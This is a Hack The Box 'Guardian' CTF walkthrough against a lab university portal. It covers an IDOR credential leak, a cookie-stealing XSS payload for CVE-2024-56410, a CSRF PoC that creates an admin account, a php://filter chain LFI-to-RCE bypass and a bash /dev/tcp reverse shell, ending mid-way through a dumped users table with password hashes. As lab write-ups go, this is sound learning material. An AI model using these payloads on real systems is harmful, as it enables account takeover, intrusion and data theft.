---
title: "HTB: Guardian"
date: 2025-10-04 00:00 +0800
categories: [Boot2Root]
tags: [HTB,Hard,Web Exploitation,IDOR,LFI,RCE,Stored XSS,CVE-2024-56410]
image: https://github.com/user-attachments/assets/6f036b82-9ddb-4ab3-a366-fb2371f975d0
---

<img width="699" height="251" alt="image" src="https://github.com/user-attachments/assets/6f036b82-9ddb-4ab3-a366-fb2371f975d0" />

Enumerated subdomain, chained an unauthenticated IDOR to leak creds, used **CVE-2024-56410** with stored-XSS to hijack session, abused weak CSRF to auto-create an admin privilege accounts, bypassed report regex with a ``php://filter`` chain for ``LFI`` --> ``RCE``, escalated via a sudo-able Python tool with a group-writable import, then ran ErrorLog reverse-shell config to pop root.

## Tools
- nmap
- gobuster
- Burp Suite Professional
- TreeGrid
- php_filter_chain_generator.py
- hashcat
- penelope
- nano
- subl

netstat (service checks)
## Recon

nmap scan result:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Guardian]
└─$ cat nmap-scan.txt 
# Nmap 7.95 scan initiated Fri Oct 24 00:52:11 2025 as: /usr/lib/nmap/nmap --privileged -sCV -oN nmap-scan.txt -vv -p- -T4 10.10.11.84
Nmap scan report for 10.10.11.84
Host is up, received echo-reply ttl 63 (0.014s latency).
Scanned at 2025-10-24 00:52:11 +08 for 19s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9c:69:53:e1:38:3b:de:cd:42:0a:c8:6b:f8:95:b3:62 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEtPLvoTptmr4MsrtI0K/4A73jlDROsZk5pUpkv1rb2VUfEDKmiArBppPYZhUo+Fopcqr4j90edXV+4Usda76kI=
|   256 3c:aa:b9:be:17:2d:5e:99:cc:ff:e1:91:90:38:b7:39 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHTkehIuVT04tJc00jcFVYdmQYDY3RuiImpFenWc9Yi6
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://guardian.htb/
Service Info: Host: _default_; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct 24 00:52:30 2025 -- 1 IP address (1 host up) scanned in 19.26 seconds
```

Nmap found a live host at **10.10.11.84** with **SSH (port 22)** and **HTTP (port 80)**.

- SSH (22): remote shell access if credentials or key are compromised
- HTTP (80): redirect to http://guardian.htb/ (University Student Portal)

<img width="1710" height="845" alt="image" src="https://github.com/user-attachments/assets/2103fb10-1080-4de2-a63d-39ac26c197e3" />

## Initial Enumeration

In the first reconnaissance phase we searched for known exploits using **searchsploit** based on the Nmap results, but found nothing useful.

Because there were no valid credentials or obvious SSH exploits, we focused on the web service on **port 80**. 

### Subdomain Enumeration

From the **Contact Us** section we did see the use of **``admissions@guardian.htb``** instead of **admissions@guardian.com** 

<img width="1576" height="510" alt="image" src="https://github.com/user-attachments/assets/d6972740-220a-40a9-a94f-b731fa84fc03" />

That led us to enumerate the subdomain with **gobuster** because that's how it is with most HTB machines

```
┌──(kali㉿kali)-[~/Desktop/HTB/Guardian]
└─$ gobuster vhost -u http://guardian.htb -w /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt --ad
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://guardian.htb
[+] Method:                    GET
[+] Threads:                   10
[+] Wordlist:                  /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt
[+] User Agent:                gobuster/3.8
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
kubernetes.guardian.htb Status: 301 [Size: 317] [--> http://guardian.htb/]
api.guardian.htb Status: 301 [Size: 310] [--> http://guardian.htb/]
www.guardian.htb Status: 301 [Size: 310] [--> http://guardian.htb/]
m.guardian.htb Status: 301 [Size: 308] [--> http://guardian.htb/]
default.guardian.htb Status: 301 [Size: 314] [--> http://guardian.htb/]
image.guardian.htb Status: 301 [Size: 312] [--> http://guardian.htb/]
secure.guardian.htb Status: 301 [Size: 313] [--> http://guardian.htb/]
^C

┌──(kali㉿kali)-[~/Desktop/HTB/Guardian]
└─$ gobuster vhost -u http://guardian.htb -w /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt --ad -xs 301                                                                                   
===============================================================                                        
Gobuster v3.8                                                                                          
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)                                          
===============================================================                                        
[+] Url:                       http://guardian.htb                                                     
[+] Method:                    GET                                                                     
[+] Threads:                   10                                                                      
[+] Wordlist:                  /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt       
[+] User Agent:                gobuster/3.8                                                            
[+] Timeout:                   10s                                                                     
[+] Append Domain:             true                                                                    
[+] Exclude Hostname Length:   false                                                                   
===============================================================                                        
Starting gobuster in VHOST enumeration mode                                                            
===============================================================                                        
portal.guardian.htb Status: 302 [Size: 0] [--> /login.php]
gitea.guardian.htb Status: 200 [Size: 13498]
```

And we found different subdomain called **gitea** under ``guardian.htb``.

We might required valid creds to logged in as authorized user because there's no known vulnerabilities for this specific gitea version and common creds was not working. so i might leave this for now.

<img width="1714" height="849" alt="image" src="https://github.com/user-attachments/assets/42b3577e-e32d-43af-87bc-9fbc9127d336" />

### Authenticated as Student

<img width="1718" height="842" alt="image" src="https://github.com/user-attachments/assets/753af7b2-e209-449b-8a5d-744cd574065f" />

<img width="1707" height="849" alt="image" src="https://github.com/user-attachments/assets/6854f2ba-17fa-4969-99f7-8447ee0874d4" />

<img width="1406" height="842" alt="image" src="https://github.com/user-attachments/assets/80486a0a-10f9-4693-a0fd-96e5286c203f" />

Those 3 students password are still using **default password** which is ``GU1234``.

## IDOR

Upon playing around with its functionalities, in chat section. We could see that there's **[IDOR vulnerabilities](https://portswigger.net/web-security/access-control/idor)** which will leak us chat of another users to another **without** require us **authenticated**.

<img width="700" height="200" alt="image" src="https://github.com/user-attachments/assets/b9cd98df-3226-491a-b772-50b3238f6a3e" />

From selecting other users, we would be able to identify the unique ID. 

<img width="250" height="480" alt="image" src="https://github.com/user-attachments/assets/f1ad1dbf-984d-4ded-85f4-94e70d746ace" />

Then we will get this: 

```url
http://portal.guardian.htb/student/chat.php?chat_users[0]=1&chat_users[1]=2
```

<img width="1451" height="524" alt="image" src="https://github.com/user-attachments/assets/d0a722f2-34cd-49f9-b92d-09f54b6ea888" />

This should be jamil's creds for gitea with email = **``jamil.enockson@guardian.htb``** & pass = **``DHsNnk3V503``**

<img width="1718" height="573" alt="image" src="https://github.com/user-attachments/assets/ad924126-ffda-40dc-8ae0-de560db1ceda" />

Authenticated. And these are all the source code pushed for both **portal.guardian.htb** and **guardian.htb**. Things turned from **black** to **white**.

<img width="1327" height="517" alt="image" src="https://github.com/user-attachments/assets/25175c30-b05c-44bf-82b3-5136fabd8641" />

## CVE-2024-56410

Look for **``phpspreadsheet:3.7.0``** known vulnerabilities gave us **[this](https://github.com/advisories/GHSA-wv23-996v-q229)**.

So with this vulnerability, we would actually can embed xss in the properties. But how do we use those? Here's the situation, 

Student actually required to submit an assignment with **``.docx``**/**``.xlsx``** file type. And lecturers would required to **review the assignment**.

<img width="1712" height="845" alt="image" src="https://github.com/user-attachments/assets/c374f814-e9e0-424f-956e-0e73c54bb11d" />

So this should be Stored XSS that could lead use to steal lecturers cookies. I used **[TreeGrid](https://www.treegrid.com/FSheet)** to generate the exploit.

Payload used:
```
<img src=x onerror=this.src='http://10.10.14.113:5432?cookie='+document.cookie>
```

### Authenticated as Lecturers

<img width="768" height="388" alt="image" src="https://github.com/user-attachments/assets/8efae4a6-dfb4-48d7-ab09-dc837d7f829f" />

<img width="1702" height="838" alt="image" src="https://github.com/user-attachments/assets/dbf03670-6aa3-4bbb-af33-a8611ec34e88" />

Change the session cookies with the one we stole, and refresh

<img width="868" height="534" alt="image" src="https://github.com/user-attachments/assets/6c7cc448-35c6-4f5d-9fa5-2cad146a6449" />

we are in as **Lecturers**:

<img width="1713" height="850" alt="image" src="https://github.com/user-attachments/assets/5052a4aa-ff89-4679-8eba-17f0c4140e26" />

## CSRF

After going through the source code again, from **[createuser.php](http://gitea.guardian.htb/Guardian/portal.guardian.htb/src/branch/main/admin/createuser.php)**. The csrf protection was not strong enough. 
We can simply use **new** ``csrf_token`` from **Lecturers** Create New Notice post request.

``create.php``
```
<?php
require '../../includes/auth.php';
require '../../config/db.php';
require '../../models/Notice.php';
require '../../config/csrf-tokens.php';

$token = bin2hex(random_bytes(16));
add_token_to_pool($token);

if (!isAuthenticated() || $_SESSION['user_role'] !== 'lecturer') {
    header('Location: /login.php');
    exit();
}

$noticeModel = new Notice($pdo);

// Check for existing pending notice
$pendingNotice = $noticeModel->getPendingNoticeByUser($_SESSION['user_id']);
if ($pendingNotice) {
    $error = 'You already have a notice pending approval by the admin. Wait a while before it gets approved.';
} else {
    // Handle form submission
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $csrf_token = $_POST['csrf_token'] ?? '';

        if (!is_valid_token($csrf_token)) {
            die("Invalid CSRF token!");
        }

        $title = $_POST['title'];
        $content = $_POST['content'];
        $reference_link = $_POST['reference_link'];
        $created_by = $_SESSION['user_id'];

        if ($noticeModel->create(['title' => $title, 'content' => $content, 'reference_link' => $reference_link, 'created_by' => $created_by], false)) {
            $success = 'Notice created successfully. It is pending approval by the admin.';
        } else {
            $error = 'Failed to create notice.';
        }
    }
}
?>
```

So, we create new notice. Then the notice would go through **Admin** because it is required for an **admin review** the notice **[create.php](http://gitea.guardian.htb/Guardian/portal.guardian.htb/src/branch/main/lecturer/notices/create.php)**, and once admin reviewed the notice. It would automatically create our account with admin privileges. 
This ``document.forms[0].submit();`` require no action from admin.

``createuser.php``
```
<?php
require '../includes/auth.php';
require '../config/db.php';
require '../models/User.php';
require '../config/csrf-tokens.php';

$token = bin2hex(random_bytes(16));
add_token_to_pool($token);

if (!isAuthenticated() || $_SESSION['user_role'] !== 'admin') {
    header('Location: /login.php');
    exit();
}

$config = require '../config/config.php';
$salt = $config['salt'];

$userModel = new User($pdo);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $csrf_token = $_POST['csrf_token'] ?? '';

    if (!is_valid_token($csrf_token)) {
        die("Invalid CSRF token!");
    }

    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    $full_name = $_POST['full_name'] ?? '';
    $email = $_POST['email'] ?? '';
    $dob = $_POST['dob'] ?? '';
    $address = $_POST['address'] ?? '';
    $user_role = $_POST['user_role'] ?? '';

    // Check for empty fields
    if (empty($username) || empty($password) || empty($full_name) || empty($email) || empty($dob) || empty($address) || empty($user_role)) {
        $error = "All fields are required. Please fill in all fields.";
    } else {
        $password = hash('sha256', $password . $salt);

        $data = [
            'username' => $username,
            'password_hash' => $password,
            'full_name' => $full_name,
            'email' => $email,
            'dob' => $dob,
            'address' => $address,
            'user_role' => $user_role
        ];

        if ($userModel->create($data)) {
            header('Location: /admin/users.php?created=true');
            exit();
        } else {
            $error = "Failed to create user. Please try again.";
        }
    }
}
?>
```

To generate CSRF POC we can use **[Burpsuite Pro](https://portswigger.net/burp/documentation/desktop/tools/engagement-tools/generate-csrf-poc)** or **[CSRF Shark](https://csrfshark.github.io/app/)** 

<img width="750" height="643" alt="image" src="https://github.com/user-attachments/assets/de193fbc-fbc0-425e-82a2-042388b533df" />

<img width="1882" height="633" alt="image" src="https://github.com/user-attachments/assets/5d65a38e-c68d-45ae-b05c-22c1be5408f5" />

Again, we need **valid** ``csrf_token`` from the source code and, exchange the variables and value **required** to create new user from ``createuser.php``.

### Authenticated as Admin

Here's the final ``.html`` file:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form method="POST" action="http://portal.guardian.htb/admin/createuser.php" id="Form">
      <input type="hidden" name="csrf_token" value="f96df9bfae536e1764e0ada87af8d3a8">
      <input type="hidden" name="username" value="kryzi">
          <input type="hidden" name="password" value="Password123!">
          <input type="hidden" name="full_name" value="kryzi">
          <input type="hidden" name="email" value="kryzi@guardian.htb">
          <input type="hidden" name="dob" value="2025-10-10">
          <input type="hidden" name="address" value="Admin Address">
          <input type="hidden" name="user_role" value="admin">
          <button type="submit">Create Admin Account</button>
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

<img width="1713" height="844" alt="image" src="https://github.com/user-attachments/assets/955118d6-440e-4512-b333-da09d5848505" />

<img width="1718" height="846" alt="image" src="https://github.com/user-attachments/assets/3b313c55-ec8e-409f-9d1b-28e9476d15e3" />

## LFI

After reviewing admin panel. We found, possible LFI vuln. 

<img width="1121" height="681" alt="image" src="https://github.com/user-attachments/assets/1a5a1b66-480a-493d-8457-0ac4c321d0f8" />

But, 

<img width="1260" height="397" alt="image" src="https://github.com/user-attachments/assets/55d164ce-0b8c-4938-8b05-32b22cef7c8f" />

I went and review the source code from **Gitea**:

``reports.php``

```php
<?php
require '../includes/auth.php';
require '../config/db.php';

if (!isAuthenticated() || $_SESSION['user_role'] !== 'admin') {
    header('Location: /login.php');
    exit();
}

$report = $_GET['report'] ?? 'reports/academic.php';

if (strpos($report, '..') !== false) {
    die("<h2>Malicious request blocked 🚫 </h2>");
}   

if (!preg_match('/^(.*(enrollment|academic|financial|system)\.php)$/', $report)) {
    die("<h2>Access denied. Invalid file 🚫</h2>");
}

?>
```

### Regex Bypass

The code blocks directory traversal ``(..)`` and only allows access to a few specific PHP files.
Anything else is treated as malicious or invalid and immediately denied.

The source code showed two checks: ``.. = Malicious request blocked 🚫`` and a regex block for ``enrollment|academic|financial|system.php``

I tested ``?report=PAYLOAD+system.php (space URL-encoded as +)``

<img width="1383" height="725" alt="image" src="https://github.com/user-attachments/assets/b2d4bf56-f292-4437-bdb9-15639c606896" />

It bypassed but no **/etc/hosts**, After digging I discovered a useful **[repo](https://github.com/synacktiv/php_filter_chain_generator)** for building **php://filter chains** 

```
python3 php_filter_chain_generator.py --chain '<?php system("id");?>'
[+] The following gadget chain will generate the following code : <?php system("id");?> (base64 value: PD9waHAgc3lzdGVtKCJpZCIpOz8+)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```
*(don't forget to add +system.php in the end)*

<img width="1383" height="716" alt="image" src="https://github.com/user-attachments/assets/04a81840-98c6-4f82-8799-f4d47c836978" />

## Shell as www-data

Change the payload to get RCE:

```
$ python3 php_filter_chain_generator.py --chain '<?php system("bash -c '\''bash -i >& /dev/tcp/10.10.14.113/1234 0>&1'\''");?>'
[+] The following gadget chain will generate the following code : <?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.113/1234 0>&1'");?> (base64 value: PD9waHAgc3lzdGVtKCJiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjExMy8xMjM0IDA+JjEnIik7Pz4)
php://filter/convert.iconv.UTF8.CSISO2022KR|...|convert.base64-decode/resource=php://temp                                                                                                   
```

Setup a listener

```
┌──(kali㉿kali)-[~/Desktop/HTB/Guardian]
└─$ penelope -p 1234
[+] Listening for reverse shells on 0.0.0.0:1234 →  127.0.0.1 • 192.168.134.128 • 10.10.14.113
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)

```

Send the request

<img width="1380" height="724" alt="image" src="https://github.com/user-attachments/assets/33cb1b04-107b-450a-969b-12c2cf4d5b5d" />

```
┌──(kali㉿kali)-[~/Desktop/HTB/Guardian]
└─$ penelope -p 1234
[+] Listening for reverse shells on 0.0.0.0:1234 →  127.0.0.1 • 192.168.134.128 • 10.10.14.113
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from guardian~10.10.11.84-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/guardian~10.10.11.84-Linux-x86_64/2025_10_24-20_33_09-751.log 📜                                                                                                   
────────────────────────────────────────────────────────────────────────────────────────────────────────
bash-5.1$ 
```
### MySQL

Based on ``config.php`` that we had from **[Gitea](http://gitea.guardian.htb/Guardian/portal.guardian.htb/src/branch/main/config/config.php)**

<img width="1345" height="498" alt="image" src="https://github.com/user-attachments/assets/dde0e337-2b0b-4915-b272-a1e08106e1d4" />

```
bash-5.1$ netstat -tulnp
netstat -tulnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
bash-5.1$ 
```

We can find there's an running services on **[port 3306](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml?search=3306)** 

Connect with the MySQL

```
bash-5.1$ mysql -h 127.0.0.1 -u root -pGu4rd14n_un1_1s_th3_b3st guardiandb
mysql: [Warning] Using a password on the command line interface can be insecure.
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 58648
Server version: 8.0.43-0ubuntu0.22.04.1 (Ubuntu)

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| guardiandb         |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

```

There's guardiandb

```
mysql> use guardiandb;
Database changed
mysql> show tables;
+----------------------+
| Tables_in_guardiandb |
+----------------------+
| assignments          |
| courses              |
| enrollments          |
| grades               |
| messages             |
| notices              |
| programs             |
| submissions          |
| users                |
+----------------------+
9 rows in set (0.00 sec)
```
There's users table
```
mysql> select * from users;
+---------+--------------------+------------------------------------------------------------------+----------------------+---------------------------------+------------+-------------------------------------------------------------------------------+-----------+--------+---------------------+---------------------+
| user_id | username           | password_hash                                                    | full_name            | email                           | dob        | address                                                                       | user_role | status | created_at          | updated_at          |
+---------+--------------------+------------------------------------------------------------------+----------------------+---------------------------------+------------+-------------------------------------------------------------------------------+-----------+--------+---------------------+---------------------+
|       1 | admin              | 694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6 | System Admin         | admin@guardian.htb              | 2003-04-09 | 2625 Castlegate Court, Garden Grove, California, United States, 92645         | admin     | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|       2 | jamil.enockson     | c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250 | Jamil Enocksson      | jamil.enockson@guardian.htb     | 1999-09-26 | 1061 Keckonen Drive, Detroit, Michigan, United States, 48295                  | admin     | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|       3 | mark.pargetter     | 8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e | Mark Pargetter       | mark.pargetter@guardian.htb     | 1996-04-06 | 7402 Santee Place, Buffalo, New York, United States, 14210                    | admin     | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|       4 | valentijn.temby    | 1d1bb7b3c6a2a461362d2dcb3c3a55e71ed40fb00dd01d92b2a9cd3c0ff284e6 | Valentijn Temby      | valentijn.temby@guardian.htb    | 1994-05-06 | 7429 Gustavsen Road, Houston, Texas, United States, 77218                     | lecturer  | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|       5 | leyla.rippin       | 7f6873594c8da097a78322600bc8e42155b2db6cce6f2dab4fa0384e217d0b61 | Leyla Rippin         | leyla.rippin@guardian.htb       | 1999-01-30 | 7911 Tampico Place, Columbia, Missouri, United States, 65218                  | lecturer  | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|       6 | perkin.fillon      | 4a072227fe641b6c72af2ac9b16eea24ed3751211fb6807cf4d794ebd1797471 | Perkin Fillon        | perkin.fillon@guardian.htb      | 1991-03-19 | 3225 Olanta Drive, Atlanta, Georgia, United States, 30368                     | lecturer  | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|       7 | cyrus.booth        | 23d701bd2d5fa63e1a0cfe35c65418613f186b4d84330433be6a42ed43fb51e6 | Cyrus Booth          | cyrus.booth@guardian.htb        | 2001-04-03 | 4214 Dwight Drive, Ocala, Florida, United States, 34474                       | lecturer  | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|       8 | sammy.treat        | c7ea20ae5d78ab74650c7fb7628c4b44b1e7226c31859d503b93379ba7a0d1c2 | Sammy Treat          | sammy.treat@guardian.htb        | 1997-03-26 | 13188 Mount Croghan Trail, Houston, Texas, United States, 77085               | lecturer  | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|       9 | crin.hambidge      | 9b6e003386cd1e24c97661ab4ad2c94cc844789b3916f681ea39c1cbf13c8c75 | Crin Hambidge        | crin.hambidge@guardian.htb      | 1997-09-28 | 4884 Adrienne Way, Flint, Michigan, United States, 48555                      | lecturer  | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      10 | myra.galsworthy    | ba227588efcb86dcf426c5d5c1e2aae58d695d53a1a795b234202ae286da2ef4 | Myra Galsworthy      | myra.galsworthy@guardian.htb    | 1992-02-20 | 13136 Schoenfeldt Street, Odessa, Texas, United States, 79769                 | lecturer  | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      11 | mireielle.feek     | 18448ce8838aab26600b0a995dfebd79cc355254283702426d1056ca6f5d68b3 | Mireielle Feek       | mireielle.feek@guardian.htb     | 2001-08-01 | 13452 Fussell Way, Raleigh, North Carolina, United States, 27690              | lecturer  | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      12 | vivie.smallthwaite | b88ac7727aaa9073aa735ee33ba84a3bdd26249fc0e59e7110d5bcdb4da4031a | Vivie Smallthwaite   | vivie.smallthwaite@guardian.htb | 1993-04-02 | 8653 Hemstead Road, Houston, Texas, United States, 77293                      | lecturer  | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      13 | GU0142023          | 5381d07c15c0f0107471d25a30f5a10c4fd507abe322853c178ff9c66e916829 | Boone Basden         | GU0142023@guardian.htb          | 2001-09-12 | 10523 Panchos Way, Columbus, Ohio, United States, 43284                       | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      14 | GU6262023          | 87847475fa77edfcf2c9e0973a91c9b48ba850e46a940828dfeba0754586938f | Jamesy Currin        | GU6262023@guardian.htb          | 2001-11-28 | 13972 Bragg Avenue, Dulles, Virginia, United States, 20189                    | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      15 | GU0702025          | 48b16b7f456afa78ba00b2b64b4367ded7d4e3daebf08b13ff71a1e0a3103bb1 | Stephenie Vernau     | GU0702025@guardian.htb          | 1996-04-16 | 14649 Delgado Avenue, Tacoma, Washington, United States, 98481                | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      16 | GU0762023          | e7ff40179d9a905bc8916e020ad97596548c0f2246bfb7df9921cc8cdaa20ac2 | Milly Saladine       | GU0762023@guardian.htb          | 1995-11-19 | 2031 Black Stone Place, San Francisco, California, United States, 94132       | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      17 | GU9492024          | 8ae72472bd2d81f774674780aef36fc20a0234e62cdd4889f7b5a6571025b8d1 | Maggy Clout          | GU9492024@guardian.htb          | 2000-05-30 | 8322 Richland Road, Billings, Montana, United States, 59112                   | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
